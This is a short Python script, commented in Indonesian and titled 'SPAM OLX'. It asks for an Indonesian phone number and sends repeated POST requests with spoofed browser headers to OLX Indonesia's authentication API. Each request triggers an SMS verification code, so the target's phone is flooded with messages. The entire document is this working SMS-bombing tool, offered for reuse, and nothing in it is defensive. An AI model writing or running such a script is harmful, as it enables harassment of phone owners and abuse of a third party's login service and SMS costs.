# Mau Recode? , Gpp , Asalkan Gw Bahagia Dalam Membuat Script ^_^ , Thanks

import requests,os,sys,json,shutil
from time import sleep

r='\033[1;91m'
k='\033[1;92m'
c='\033[1;96m'
p='\033[1;95m'
b='\033[1;94m'
o='\033[1;90m'
u='\033[1;97m'
q='\x1b[105m\x1b[37;1m'
s='\x1b[0m'


sleep(1)
print("")
os.system('clear')
os.system('figlet SPAM OLX')
print("")
print(" \033[0;30mSpam \033[0;31mOlx \033[30;1mUnli \033[0;30m, \033[0;30mKode Negara \033[31;1m: \033[0;33m8** \033[0;30m, \033[0;30mNb \033[31;1m: \033[30;1mCtrl + z \033[0;30mUntuk Berhenti Spam\033[31;m!\033[30;1m.\n")
print("•════════════════════════════════• \n")

r = requests.Session()
head = {
"accept": "*/*",
"x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
"x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"content-type": "application/json",
}
nom = input(f' \033[30;1m[\033[31;1m•\033[30;1m] \033[0;30mNomor \033[31;1m: \033[30;1m')

dat = json.dumps({
  "grantType": "retry",
  "method": "sms",
  "phone": "+62"+nom,
  "language": "id"
})

for x in range(5):
	cal = r.post("https://www.olx.co.id/api/auth/authenticate",data=dat,headers=head).text
	if 'status' in cal:
		print(f"\n \033[30;1m[\033[31;1m•\033[30;1m] \033[0;30mBerhasil \033[0;37mSpam \033[0;30mKe Nomor \033[31;1m: \033[0;33m{nom} ")
		sleep(2)
	else:
		print(f"\n \033[30;1m[\033[31;1m•\033[30;1m] \033[0;30mSpam \033[0;37mGagal \033[0;30mKe \033[0;33m{nom} \033[31;1m..")
		sleep(2)
		exit("")

olx()


